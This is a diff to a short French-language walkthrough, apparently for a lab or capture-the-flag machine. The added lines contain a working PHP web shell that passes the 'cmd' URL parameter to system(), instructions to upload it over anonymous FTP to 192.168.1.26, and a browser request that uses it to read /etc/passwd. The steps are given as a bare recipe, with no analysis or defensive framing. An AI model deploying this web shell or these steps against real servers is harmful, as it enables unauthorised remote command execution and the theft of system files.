@@ -33,12 +33,25 @@ nmap -A ```adresse```
 # se connecter
 se connecter et examiner les fichiers trouvés
 
+# créer webshell.php et y mettre ceci:
+```
+<?php
+if(isset($_GET['cmd'])) {
+    echo "<pre>";
+    $cmd = ($_GET['cmd']);
+    system($cmd);
+    echo "</pre>";
+}
+?>
+```
+
 # mettre ceci
 ftp 192.168.1.26
 login: anonymous
 pwd: Entrée (le bouton)
 
-# gobuster dir -u http://192.168.1.26/ -w /usr/share/wordlists/dirb/common.txt 
+# téléverser le fichier
+```put webshell.php```
 
-# curl http://192.168.1.26/files/
-
+# mettre ceci dans le navigateur:
+http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
